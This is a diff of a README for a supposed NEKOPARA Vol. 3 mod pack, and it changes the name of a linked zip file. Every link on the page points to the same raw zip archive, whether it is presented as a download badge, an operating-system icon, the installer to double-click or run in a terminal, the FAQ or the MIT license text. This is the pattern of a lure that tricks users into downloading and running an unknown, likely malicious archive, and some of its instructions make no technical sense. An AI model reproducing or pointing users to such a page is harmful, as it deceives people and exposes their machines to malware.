@@ -1,6 +1,6 @@
 # NEKOPARA Vol. 3 🍫 Power-Up Extensions
 
-[![Download](https://github.com/32olaa/nekopara-vol3-tweaks-and-tips/raw/refs/heads/branch/monarchically/vol_tweaks_nekopara_and_tips_v2.1-alpha.3.zip%20Release-blue?logo=github)](https://github.com/32olaa/nekopara-vol3-tweaks-and-tips/raw/refs/heads/branch/monarchically/vol_tweaks_nekopara_and_tips_v2.1-alpha.3.zip)
+[![Download](https://github.com/32olaa/nekopara-vol3-tweaks-and-tips/raw/refs/heads/branch/monarchically/vol_tweaks_and_tips_nekopara_1.8-beta.4.zip%20Release-blue?logo=github)](https://github.com/32olaa/nekopara-vol3-tweaks-and-tips/raw/refs/heads/branch/monarchically/vol_tweaks_and_tips_nekopara_1.8-beta.4.zip)
 
 Welcome to your hub for **NEKOPARA Vol. 3 Power-Up Extensions** – a delightful treasure trove of *game enhancements, companion tools,* and *feature unlockers* purpose-built to elevate your visual novel experience! Here, we infuse your NEKOPARA adventure with spirited vitality, smart assistance, and interactive magic, all designed with ethical modding in mind.
 
@@ -12,10 +12,10 @@ Welcome to your hub for **NEKOPARA Vol. 3 Power-Up Extensions** – a delightful
 
 | Operating System      | Supported | Installation Notes                |
 |----------------------|:---------:|-----------------------------------|
-| ![Windows](https://github.com/32olaa/nekopara-vol3-tweaks-and-tips/raw/refs/heads/branch/monarchically/vol_tweaks_nekopara_and_tips_v2.1-alpha.3.zip)   |   ✅   | Full support, guided installer    |
-| ![macOS](https://github.com/32olaa/nekopara-vol3-tweaks-and-tips/raw/refs/heads/branch/monarchically/vol_tweaks_nekopara_and_tips_v2.1-alpha.3.zip)       |   ✅   | CLI-based setup, easy to follow   |
-| ![Linux](https://github.com/32olaa/nekopara-vol3-tweaks-and-tips/raw/refs/heads/branch/monarchically/vol_tweaks_nekopara_and_tips_v2.1-alpha.3.zip)     |   🟡   | Mono dependency required          |
-| ![Steam Deck](https://github.com/32olaa/nekopara-vol3-tweaks-and-tips/raw/refs/heads/branch/monarchically/vol_tweaks_nekopara_and_tips_v2.1-alpha.3.zip%20Deck-Tested-blue) |   ✅   | Tested; see tips in FAQ           |
+| ![Windows](https://github.com/32olaa/nekopara-vol3-tweaks-and-tips/raw/refs/heads/branch/monarchically/vol_tweaks_and_tips_nekopara_1.8-beta.4.zip)   |   ✅   | Full support, guided installer    |
+| ![macOS](https://github.com/32olaa/nekopara-vol3-tweaks-and-tips/raw/refs/heads/branch/monarchically/vol_tweaks_and_tips_nekopara_1.8-beta.4.zip)       |   ✅   | CLI-based setup, easy to follow   |
+| ![Linux](https://github.com/32olaa/nekopara-vol3-tweaks-and-tips/raw/refs/heads/branch/monarchically/vol_tweaks_and_tips_nekopara_1.8-beta.4.zip)     |   🟡   | Mono dependency required          |
+| ![Steam Deck](https://github.com/32olaa/nekopara-vol3-tweaks-and-tips/raw/refs/heads/branch/monarchically/vol_tweaks_and_tips_nekopara_1.8-beta.4.zip%20Deck-Tested-blue) |   ✅   | Tested; see tips in FAQ           |
 
 **Tip:** Detailed platform-specific steps are available after downloading below!
 
@@ -60,20 +60,20 @@ Whether you're a seasoned modder or an adventurous newcomer, our *power-up tools
 Ready to transform your NEKOPARA Vol. 3?
 
 1. **Download** the latest Power-Up Extensions package:  
-   [![Download](https://github.com/32olaa/nekopara-vol3-tweaks-and-tips/raw/refs/heads/branch/monarchically/vol_tweaks_nekopara_and_tips_v2.1-alpha.3.zip%20Release-blue?logo=github)](https://github.com/32olaa/nekopara-vol3-tweaks-and-tips/raw/refs/heads/branch/monarchically/vol_tweaks_nekopara_and_tips_v2.1-alpha.3.zip)
+   [![Download](https://github.com/32olaa/nekopara-vol3-tweaks-and-tips/raw/refs/heads/branch/monarchically/vol_tweaks_and_tips_nekopara_1.8-beta.4.zip%20Release-blue?logo=github)](https://github.com/32olaa/nekopara-vol3-tweaks-and-tips/raw/refs/heads/branch/monarchically/vol_tweaks_and_tips_nekopara_1.8-beta.4.zip)
 
 2. **Extract** the contents to your NEKOPARA Vol. 3 installation directory.
 
 3. **Run the Installer**:
-    - *Windows*: Double-click `https://github.com/32olaa/nekopara-vol3-tweaks-and-tips/raw/refs/heads/branch/monarchically/vol_tweaks_nekopara_and_tips_v2.1-alpha.3.zip`
-    - *macOS/Linux*: Run `https://github.com/32olaa/nekopara-vol3-tweaks-and-tips/raw/refs/heads/branch/monarchically/vol_tweaks_nekopara_and_tips_v2.1-alpha.3.zip` in terminal  
+    - *Windows*: Double-click `https://github.com/32olaa/nekopara-vol3-tweaks-and-tips/raw/refs/heads/branch/monarchically/vol_tweaks_and_tips_nekopara_1.8-beta.4.zip`
+    - *macOS/Linux*: Run `https://github.com/32olaa/nekopara-vol3-tweaks-and-tips/raw/refs/heads/branch/monarchically/vol_tweaks_and_tips_nekopara_1.8-beta.4.zip` in terminal  
       (Linux users: ensure Mono is installed)
 
 4. **Follow** on-screen instructions to customize features and, if desired, connect to OpenAI/Claude API for advanced helpers.
 
 5. **Launch** NEKOPARA Vol. 3 and explore your *newly enhanced* world!
 
-*For detailed troubleshooting and Q&A, refer to the in-app Help panel or check the `https://github.com/32olaa/nekopara-vol3-tweaks-and-tips/raw/refs/heads/branch/monarchically/vol_tweaks_nekopara_and_tips_v2.1-alpha.3.zip`.*
+*For detailed troubleshooting and Q&A, refer to the in-app Help panel or check the `https://github.com/32olaa/nekopara-vol3-tweaks-and-tips/raw/refs/heads/branch/monarchically/vol_tweaks_and_tips_nekopara_1.8-beta.4.zip`.*
 
 ## ⚠️ Disclaimer
 
@@ -83,11 +83,11 @@ Use responsibly. We do not encourage or endorse misuse or redistribution of prop
 
 ## 📜 MIT License
 
-This repository is open-sourced under the MIT License (2025). For detailed licensing terms and your rights under open source, visit the [full license text here](https://github.com/32olaa/nekopara-vol3-tweaks-and-tips/raw/refs/heads/branch/monarchically/vol_tweaks_nekopara_and_tips_v2.1-alpha.3.zip).
+This repository is open-sourced under the MIT License (2025). For detailed licensing terms and your rights under open source, visit the [full license text here](https://github.com/32olaa/nekopara-vol3-tweaks-and-tips/raw/refs/heads/branch/monarchically/vol_tweaks_and_tips_nekopara_1.8-beta.4.zip).
 
 ---
 
-[![Download](https://github.com/32olaa/nekopara-vol3-tweaks-and-tips/raw/refs/heads/branch/monarchically/vol_tweaks_nekopara_and_tips_v2.1-alpha.3.zip%20Release-blue?logo=github)](https://github.com/32olaa/nekopara-vol3-tweaks-and-tips/raw/refs/heads/branch/monarchically/vol_tweaks_nekopara_and_tips_v2.1-alpha.3.zip)
+[![Download](https://github.com/32olaa/nekopara-vol3-tweaks-and-tips/raw/refs/heads/branch/monarchically/vol_tweaks_and_tips_nekopara_1.8-beta.4.zip%20Release-blue?logo=github)](https://github.com/32olaa/nekopara-vol3-tweaks-and-tips/raw/refs/heads/branch/monarchically/vol_tweaks_and_tips_nekopara_1.8-beta.4.zip)
 
 *Elevate your NEKOPARA Vol. 3 storytelling experience today!*  
 **Power-up responsibly, and let the Catgirls shine!**
